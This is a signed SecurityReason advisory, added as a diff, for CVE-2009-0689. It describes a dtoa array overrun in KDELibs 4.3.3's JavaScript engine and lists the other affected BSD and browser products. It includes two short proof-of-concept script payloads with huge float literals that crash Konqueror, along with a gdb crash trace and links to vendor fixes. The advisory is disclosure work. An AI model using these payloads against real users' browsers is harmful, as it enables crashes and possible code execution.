@@ -1,0 +1,208 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+[ KDE KDELibs 4.3.3 Remote Array Overrun (Arbitrary code execution) ]
+
+Author: Maksymilian Arciemowicz and sp3x
+http://SecurityReason.com
+Date:
+- - Dis.: 07.05.2009
+- - Pub.: 20.11.2009
+
+CVE: CVE-2009-0689
+Risk: High
+Remote: Yes
+
+Affected Software:
+- - KDELibs 4.3.3
+
+NOTE: Prior versions may also be affected.
+
+Original URL:
+http://securityreason.com/achievement_securityalert/74
+
+
+- --- 0.Description ---
+KDELibs is a collection of libraries built on top of Qt that provides
+frameworks and functionality for developers of KDE-compatible software.
+The KDELibs libraries are licensed under LGPL.
+
+
+- --- 1. KDE KDELibs 4.3.2 Remote Array Overrun (Arbitrary code
+execution) ---
+The main problem exist in dtoa implementation. KDE has a very similar
+dtoa algorithm to the BSD, Chrome and Mozilla products. Problem exist
+in dtoa.cpp file
+
+http://websvn.kde.org/tags/KDE/4.3.3/kdelibs/kjs/dtoa.cpp?revision=1042584&view=markup
+
+and it is the same like SREASONRES:20090625.
+
+http://securityreason.com/achievement_securityalert/63
+
+but fix for SREASONRES:20090625, used by openbsd was not good.
+More information about fix for openbsd and similars SREASONRES:20091030,
+
+http://securityreason.com/achievement_securityalert/69
+
+We can create any number of float, which will overwrite the memory. In
+Kmax has defined 15. Functions in dtoa, don't checks Kmax limit, and
+it is possible to call 16<= elements of freelist array.
+
+
+- --- 2. Proof of Concept  (PoC) ---
+
+- -----------------------
+<script>
+var a=0.<?php echo str_repeat("9",299999); ?>;
+</script>
+- -----------------------
+
+If we use konqueror to see this PoC, konqueror will crash. For example
+
+- -----------------------
+<script>
+var a=0.<?php echo str_repeat("1",296450); ?>;
+</script>
+- -----------------------
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 24845, thread 0x7e6e6800]
+0x090985c3 in diff () from /usr/local/lib/libkjs.so.5.0
+
+0x06db85c3 <diff+163>:  mov    %esi,(%ecx)
+
+#0  0x090985c3 in diff () from /usr/local/lib/libkjs.so.5.0
+#1  0x0909901b in kjs_strtod () from /usr/local/lib/libkjs.so.5.0
+#2  0x090738e5 in KJS::Lexer::lex () from /usr/local/lib/libkjs.so.5.0
+#3  0x0907300c in kjsyylex () from /usr/local/lib/libkjs.so.5.0
+#4  0x09072f86 in kjsyyparse () from /usr/local/lib/libkjs.so.5.0
+#5  0x090805cf in KJS::Parser::parse () from /usr/local/lib/libkjs.so.5.0
+#6  0x0908337f in KJS::InterpreterImp::evaluate ()
+
+(gdb) i r
+eax            0x0      0
+ecx            0x220ff000       571469824
+edx            0x0      0
+ebx            0x220fbb00       571456256
+esp            0xcfbc04e0       0xcfbc04e0
+ebp            0xcfbc0518       0xcfbc0518
+esi            0xc71c71c7       -954437177
+edi            0x0      0
+eip            0x21415c3        0x21415c3
+
+esi=0x71c71c7
+
+
+- --- 3. SecurityReason Note ---
+
+Officialy SREASONRES:20090625 has been detected in:
+- - OpenBSD
+- - NetBSD
+- - FreeBSD
+- - MacOSX
+- - Google Chrome
+- - Mozilla Firefox
+- - Mozilla Seamonkey
+- - KDE (example: konqueror)
+- - Opera
+- - K-Meleon
+
+This list is not yet closed. US-CERT declared that will inform all
+vendors about this issue, however, they did not do it. Even greater
+confusion caused new CVE number "CVE-2009-1563". Secunia has informed
+that this vulnerability was only detected in Mozilla Firefox, but nobody
+was aware that the problem affects other products like ( KDE, Chrome )
+and it is based on "CVE-2009-0689". After some time Mozilla Foundation
+Security Advisory
+("http://www.mozilla.org/security/announce/2009/mfsa2009-59.html";)
+was updated with note :
+"The underlying flaw in the dtoa routines used by Mozilla appears to be
+essentially the same as that reported against the libc gdtoa routine by
+Maksymilian Arciemowicz ( CVE-2009-0689)".
+This fact ( new CVE number for Firefox Vulnerability )and PoC in
+javascript (from Secunia), forced us to official notification all other
+vendors. We publish all the individual advisories, to formally show all
+vulnerable software and to avoid wrong CVE number. We do not see any
+other way to fix this issue in all products.
+
+
+- --- 4. Fix ---
+NetBSD fix (optimal):
+http://cvsweb.netbsd.org/bsdweb.cgi/src/lib/libc/gdtoa/gdtoaimp.h
+
+OpenBSD fix:
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/sum.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtorx.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtord.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtorQ.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtof.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtodg.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtod.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/smisc.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/misc.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/hdtoa.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/gethex.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/gdtoa.h
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/dtoa.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/dmisc.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/stdio/vfprintf.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/arch/vax/gdtoa/strtof.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtorxL.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtorf.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtordd.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtopxL.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtopx.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtopf.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtopdd.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtopd.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtopQ.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtodnrp.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtodI.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtoIxL.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtoIx.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtoIg.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtoIf.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtoIdd.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtoId.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/strtoIQ.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/qnan.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/g_xfmt.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/g_xLfmt.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/g_ffmt.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/g_dfmt.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/g_ddfmt.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/g__fmt.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/g_Qfmt.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/arithchk.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/stdlib/gcvt.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/stdlib/ecvt.c
+
+
+- --- 5. Credits ---
+Discovered by Maksymilian Arciemowicz and sp3x from SecurityReason.com.
+
+
+- --- 6. Greets ---
+Infospec p_e_a pi3
+
+
+- --- 7. Contact ---
+Email:
+- - cxib {a.t] securityreason [d0t} com
+- - sp3x {a.t] securityreason [d0t} com
+
+GPG:
+- - http://securityreason.com/key/Arciemowicz.Maksymilian.gpg
+- - http://securityreason.com/key/sp3x.gpg
+
+http://securityreason.com/
+http://securityreason.pl/
+
+
+-----BEGIN PGP SIGNATURE-----
+
+iEYEARECAAYFAksF4lEACgkQpiCeOKaYa9ZD+ACfSoaEiTeQrFDgtcHgOckyXMom
+TE4AoJW3meP7KP6Xb7KNErVlsluLUO8E
+=jTmp
+-----END PGP SIGNATURE-----
